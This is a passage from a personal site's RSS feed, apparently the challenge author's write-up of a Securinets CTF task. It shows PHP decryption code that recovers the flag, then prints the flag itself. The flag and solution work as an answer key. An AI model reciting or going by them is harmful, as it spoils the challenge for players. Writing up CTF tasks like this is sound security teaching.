        $words=array(&#39;kAHl4&#39;,&#39;$ecUriNets&#39;,&#39;Cha1m4&#39;,&#39;th4meUr&#39;,&#39;WhiT3HacK3Rs&#39;,&#39;Ani$Bo$$CoUldNtS0Lv31t&#39;);
        $decrypted=&amp;quot;&amp;quot;;
        for($i=0;$i&amp;lt;strlen($content);$i-=-pow(0,0))
        {
            $ser=serialize(array($words[$i % 6],&#39;securinets&#39;));
            $key=intval(explode(&amp;quot;:&amp;quot;,explode(&amp;quot;;&amp;quot;,$ser)[1])[1]);
            $decrypted=$decrypted.chr(ord($content[$i])-$key) ;
        }
        return $decrypted ;
    }
$cont=&amp;quot;eG9pfH5/c296eu+/vW01On1mP++/vTh4ZVt0SWRLe3tU77+9d2lJO1rvv71kXTZzYklkXk44MDcm77+9EA==&amp;quot; ;
$con=base64_decode($cont);
$res= decryptage($con);
echo $res;

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Executing this will give you the flag but with some unreadable characters (because of the non printable characters after crypting it) that&amp;rsquo;s why we can use curl in our cli and extract the crypted flag and save it or simply we can use a little python script
that automates this and FINALLY we got The flag :&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;securinets{W00w_3v3n_Th3_AutHor_C4Nt_S0lV3_TH1$!!}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;*** Conclusion ***&lt;/p&gt;
&lt;p&gt;I hope you liked this task , it took me 4 continuous days of hard work to implement this idea ( i had to write a big part of jwt generator ) you can find the source code in the same directory ! Anyways dont forget to star me and if you faced any problems please contact me!&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Networking and Security Tools</title>
      <link>https://ahmed-belkahla.me/project/networking-and-security/</link>
      <pubDate>Tue, 20 Aug 2019 22:31:41 +0200</pubDate>
      <guid>https://ahmed-belkahla.me/project/networking-and-security/</guid>
      <description></description>
    </item>
    
  </channel>
</rss>
